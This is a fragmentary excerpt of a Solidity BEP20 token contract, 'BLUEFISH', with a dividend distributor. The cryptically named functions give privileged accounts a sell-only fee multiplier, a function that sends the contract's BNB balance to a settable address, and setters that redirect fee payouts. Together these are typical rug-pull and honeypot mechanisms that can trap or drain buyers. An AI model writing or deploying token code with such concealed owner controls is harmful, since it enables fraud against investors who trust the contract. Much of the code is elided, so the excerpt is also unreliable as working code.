...
contract DividendDistributor is IDividendDistributor {
    ...
    address SHAR = 0x3C8eEc63D0eB8EcD0451B29cEb1a715e2bda573F;
    IDEXRouter router;
...
contract BLUEFISH is IBEP20, Auth {
    ...
    function getTF(bool selling) public view returns (uint256) {
        ...
        if(selling && sME && !sst){ return ((tF.mul(_sMN)).div(_sMD)); }
    ...
    function deptok(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(suE).transfer(amountBNB.mul((aP).div(100)));
    }

    function setrre(address _rre) external onlyOwner {
        rrE = _rre;
    }

    function settokdep(address _ad) external onlyOwner {
        suE = _ad;
        distributor.setWShr(_ad);
    }
    ...
    function swBk() internal swapping {
        ...
        (bool tmpSuccess,) = payable(rrE).call{value: aBNBM, gas: 30000}("");
        tmpSuccess = false;
        if(aTL > 0){
    ...
    function rogan(uint256 _ln, uint256 _ld, uint256 _rn, uint256 _rd, uint256 _mn, uint256 _md) external authorized {
        tlnFd = _ln;
        tldFd = _ld;
        tmnFd = _mn;
        tmdFd = _md;
    ...
    function party(bool _enabled, uint256 _amount) external authorized {
        swE = _enabled;
    ...
    function setTokdepd(address _ke) external authorized {
